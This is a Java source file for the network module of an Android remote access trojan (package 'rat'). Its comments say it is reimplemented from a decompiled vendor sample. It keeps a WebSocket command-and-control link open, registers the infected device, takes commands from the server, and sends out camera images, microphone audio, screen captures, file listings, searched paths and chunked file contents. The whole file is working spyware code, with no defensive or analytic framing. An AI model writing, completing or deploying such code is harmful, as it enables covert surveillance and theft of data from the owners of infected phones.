package com.vendor.rat.network;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/**
 * WebSocket 客户端 — 适配 Laravel Swoole WebSocket 协议
 *
 * 对齐 vendor bridge/a.java 的连接管理模式:
 *   - 不在客户端内部做自动重连
 *   - 断开时仅清理状态 (connected=false)
 *   - 重连由 KeepHeartThread 统一管理 (每 10s 检测并重连)
 *   - 避免并发重连竞争
 *
 * Laravel 协议格式:
 *   设备端 itype = "Slr_client"
 *   路由字段: itype + subc
 *   设备标识: pid (phoneId/deviceId)
 */
public class WebSocketClient extends WebSocketListener {

    private static final String TAG = "WebSocketClient";
    private static final int NORMAL_CLOSURE = 1000;

    // Laravel 协议常量 (WebSocketConfig::clientTypes())
    public static final String ITYPE_DEVICE = "Slr_client";
    public static final String SUBC_PING = "ping";
    public static final String SUBC_CAM = "cam";
    public static final String SUBC_MIC = "mic";
    public static final String SUBC_THUMB = "thumb";
    public static final String SUBC_DOWN = "down";
    public static final String SUBC_SRCH = "srch";
    public static final String SUBC_PROXY = "proxy";

    private final String wsUrl;
    private final String deviceId;
    private final Gson gson;

    private OkHttpClient client;
    private WebSocket webSocket;
    private final AtomicBoolean connected = new AtomicBoolean(false);
    private final AtomicBoolean connecting = new AtomicBoolean(false);
    private CommandListener commandListener;

    // 首次连接时的初始状态参数 (由 KeepHeartThread 设置)
    private volatile String initialStatusParams;

    public WebSocketClient(String wsUrl, String deviceId) {
        this.wsUrl = wsUrl;
        this.deviceId = deviceId;
        this.gson = new Gson();

        this.client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS) // 无超时
            .pingInterval(30, TimeUnit.SECONDS)
            .build();
    }

    /**
     * 连接 WebSocket 服务器
     * 线程安全: connecting CAS 防止并发连接
     * 对齐 vendor: bridge/a.u() — 每次由外部 (KeepHeartThread) 调用
     */
    public void connect() {
        if (connected.get()) return;
        if (!connecting.compareAndSet(false, true)) return;
        if (wsUrl == null || wsUrl.isEmpty()) {
            Log.w(TAG, "WebSocket URL is null, skipping connect");
            connecting.set(false);
            return;
        }

        Request request = new Request.Builder()
            .url(wsUrl)
            .addHeader("X-Device-Id", deviceId)
            .build();

        webSocket = client.newWebSocket(request, this);
        Log.d(TAG, "Connecting to: " + wsUrl);
    }

    /**
     * 断开连接
     */
    public void disconnect() {
        if (webSocket != null) {
            webSocket.close(NORMAL_CLOSURE, "Client disconnect");
        }
        connected.set(false);
        connecting.set(false);
    }

    /**
     * 发送原始消息
     */
    public boolean send(String message) {
        if (webSocket != null && connected.get()) {
            return webSocket.send(message);
        }
        return false;
    }

    // ============ Laravel 协议消息方法 ============

    /**
     * 构建带 itype/subc/pid 的基础消息
     */
    private JsonObject newBaseMessage(String subc) {
        JsonObject msg = new JsonObject();
        msg.addProperty("itype", ITYPE_DEVICE);
        msg.addProperty("subc", subc);
        msg.addProperty("pid", deviceId);
        return msg;
    }

    /**
     * 发送心跳 (subc="ping")
     */
    public void sendPing(String encodedStatus) {
        JsonObject msg = newBaseMessage(SUBC_PING);
        msg.addProperty("msg", encodedStatus != null ? encodedStatus : "");
        send(msg.toString());
    }

    /**
     * 通用数据上报 (msg 字段)
     */
    public void sendData(String subc, String data) {
        JsonObject msg = newBaseMessage(subc);
        msg.addProperty("msg", data != null ? data : "");
        send(msg.toString());
    }

    /**
     * 屏幕数据上报
     */
    public void sendScreen(String subc, String imgBase64, int width, int height) {
        JsonObject msg = newBaseMessage(subc);
        msg.addProperty("img", imgBase64);
        msg.addProperty("wmob", width);
        msg.addProperty("hmob", height);
        send(msg.toString());
    }

    /**
     * 相机数据上报
     */
    public void sendCamera(String imgBase64) {
        JsonObject msg = newBaseMessage(SUBC_CAM);
        msg.addProperty("img", imgBase64);
        send(msg.toString());
    }

    /**
     * 麦克风数据上报
     */
    public void sendMic(String audioData) {
        JsonObject msg = newBaseMessage(SUBC_MIC);
        msg.addProperty("voip", audioData);
        send(msg.toString());
    }

    /**
     * 缩略图上报
     */
    public void sendThumb(String data, String path) {
        JsonObject msg = newBaseMessage(SUBC_THUMB);
        msg.addProperty("msg", data);
        msg.addProperty("pth", path);
        send(msg.toString());
    }

    /**
     * 文件下载分块上报
     */
    public void sendFileChunk(String filename, String filedata, long totalSize,
                              long sentSize, int chunkNumber, String filehash, String filepath) {
        JsonObject msg = newBaseMessage(SUBC_DOWN);
        msg.addProperty("filename", filename);
        msg.addProperty("filedata", filedata);
        msg.addProperty("totalSize", totalSize);
        msg.addProperty("sentSize", sentSize);
        msg.addProperty("chunkNumber", chunkNumber);
        msg.addProperty("filehash", filehash);
        msg.addProperty("filepath", filepath);
        send(msg.toString());
    }

    /**
     * 文件搜索结果上报
     */
    public void sendSearchResult(String paths, String searchType) {
        JsonObject msg = newBaseMessage(SUBC_SRCH);
        msg.addProperty("pths", paths);
        msg.addProperty("stype", searchType);
        send(msg.toString());
    }

    /**
     * 代理状态上报
     */
    public void sendProxy(String ctype, JsonObject extraFields) {
        JsonObject msg = newBaseMessage(SUBC_PROXY);
        msg.addProperty("ctype", ctype);
        if (extraFields != null) {
            for (String key : extraFields.keySet()) {
                msg.add(key, extraFields.get(key));
            }
        }
        send(msg.toString());
    }

    /**
     * 设置初始状态参数 (onOpen 时发送)
     */
    public void setInitialStatusParams(String params) {
        this.initialStatusParams = params;
    }

    // ============ WebSocketListener 回调 ============

    @Override
    public void onOpen(WebSocket ws, Response response) {
        connected.set(true);
        connecting.set(false);
        Log.i(TAG, "WebSocket connected to: " + wsUrl);

        // 首条 ping 消息即完成设备注册
        String status = initialStatusParams != null ? initialStatusParams : "";
        sendPing(status);
        Log.d(TAG, "Registration ping sent: pid=" + deviceId);
    }

    @Override
    public void onMessage(WebSocket ws, String text) {
        Log.d(TAG, "Received: " + text);

        if (commandListener == null) return;

        try {
            JsonObject json = gson.fromJson(text, JsonObject.class);
            String type = json.has("type") ? json.get("type").getAsString() : null;
            String subc = json.has("subc") ? json.get("subc").getAsString() : null;

            if ("pong".equals(type)) {
                return;
            }

            commandListener.onCommand(type, subc, json);
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse server message: " + text, e);
        }
    }

    @Override
    public void onClosing(WebSocket ws, int code, String reason) {
        connected.set(false);
        connecting.set(false);
        Log.d(TAG, "WebSocket closing: " + code + " " + reason);
    }

    /**
     * 对齐 vendor: 断开时仅清理状态，不自动重连
     * vendor bridge/a → f1.a.i() → f138w.set(false) + q.g(bridgePath) → 置 null
     * 重连由 KeepHeartThread 在下次 tick 时处理
     */
    @Override
    public void onClosed(WebSocket ws, int code, String reason) {
        connected.set(false);
        connecting.set(false);
        Log.d(TAG, "WebSocket closed: " + code + " " + reason);
    }

    /**
     * 对齐 vendor: 连接失败时仅清理状态，不自动重连
     * vendor bridge/a.w() → f138w.set(false) + q.g(bridgePath)
     * KeepHeartThread 会在下次 tick (≤10s) 检测到断开并重连
     */
    @Override
    public void onFailure(WebSocket ws, Throwable t, Response response) {
        connected.set(false);
        connecting.set(false);
        Log.e(TAG, "WebSocket failure: " + t.getMessage());
    }

    // ============ Getters & Setters ============

    public boolean isConnected() { return connected.get(); }
    public String getDeviceId() { return deviceId; }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    /**
     * 命令监听接口
     */
    public interface CommandListener {
        void onCommand(String type, String subc, JsonObject payload);
    }
}
